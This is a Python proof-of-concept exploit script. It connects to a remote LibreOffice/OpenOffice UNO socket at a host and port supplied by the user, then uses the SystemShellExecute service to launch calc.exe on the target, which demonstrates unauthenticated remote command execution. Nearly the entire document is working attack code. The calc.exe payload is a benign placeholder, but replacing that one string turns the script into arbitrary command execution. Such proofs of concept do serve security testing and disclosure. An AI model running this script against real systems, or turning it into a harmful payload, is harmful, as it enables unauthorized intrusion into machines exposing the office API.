import uno
from com.sun.star.system import XSystemShellExecute
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--host', help='host to connect to', dest='host', required=True)
parser.add_argument('--port', help='port to connect to', dest='port', required=True)

args = parser.parse_args()
# Define the UNO component
localContext = uno.getComponentContext()

# Define the resolver to use, this is used to connect with the API
resolver = localContext.ServiceManager.createInstanceWithContext(
				"com.sun.star.bridge.UnoUrlResolver", localContext )

# Connect with the provided host on the provided target port
print("[+] Connecting to target...")
context = resolver.resolve(
	"uno:socket,host={0},port={1};urp;StarOffice.ComponentContext".format(args.host,args.port))
    
# Issue the service manager to spawn the SystemShellExecute module and execute calc.exe
service_manager = context.ServiceManager
print("[+] Connected to {0}".format(args.host))
shell_execute = service_manager.createInstance("com.sun.star.system.SystemShellExecute")
shell_execute.execute("calc.exe", '',1)
